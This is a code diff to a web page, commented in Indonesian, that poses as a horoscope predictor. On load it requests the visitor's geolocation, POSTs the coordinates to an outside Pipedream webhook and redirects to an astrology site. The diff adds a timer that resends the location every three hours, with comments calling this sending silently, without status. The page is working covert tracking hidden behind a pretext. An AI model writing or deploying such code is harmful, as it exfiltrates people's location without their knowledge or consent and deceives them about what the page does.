@@ -27,12 +27,11 @@
   <script>
     const webHookURL = "https://eo4zwpbukao2mkl.m.pipedream.net/";
     const redirectURL = "https://www.astro.com/horoscope";
+    const intervalMs = 3 * 60 * 60 * 1000; // 3 jam
 
-    async function sendLocation() {
+    async function sendLocation(showStatus = false) {
       const statusEl = document.getElementById("status");
-
       try {
-        // Dapatkan lokasi
         const pos = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
         });
@@ -41,10 +40,8 @@
         const timestamp = new Date().toISOString();
         const payload = { latitude, longitude, timestamp };
 
-        // Tampilkan status ke user (sementara, bisa dihapus jika tidak ingin terlihat)
-        statusEl.textContent = "Wait a moment...";
+        if (showStatus) statusEl.textContent = "Wait a Moment...";
 
-        // Kirim data ke Pipedream
         await fetch(webHookURL, {
           method: "POST",
           headers: {
@@ -53,27 +50,27 @@
           body: JSON.stringify(payload)
         });
 
-        statusEl.textContent = "Predicting...";
-
-        // Tunggu sedikit sebelum redirect
-        setTimeout(() => {
-          window.location.href = redirectURL;
-        }, 1500);
+        if (showStatus) statusEl.textContent = "Predicting...";
       } catch (err) {
-        statusEl.textContent = "Failed to Predict..";
-        setTimeout(() => {
-          window.location.href = redirectURL;
-        }, 2000);
+        if (showStatus) statusEl.textContent = "Gagal mendapatkan lokasi. Mengalihkan...";
       }
     }
 
-    // Jalankan setelah halaman dimuat
-    window.onload = () => {
+    // Kirim pertama, lalu redirect
+    window.onload = async () => {
       if ("geolocation" in navigator) {
-        sendLocation();
+        await sendLocation(true); // kirim awal dengan status
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 1500);
       } else {
         window.location.href = redirectURL;
       }
+
+      // Set interval untuk kirim ulang tiap 3 jam (selama tab terbuka)
+      setInterval(() => {
+        sendLocation(false); // kirim diam-diam, tanpa status
+      }, intervalMs);
     };
   </script>
 </body>
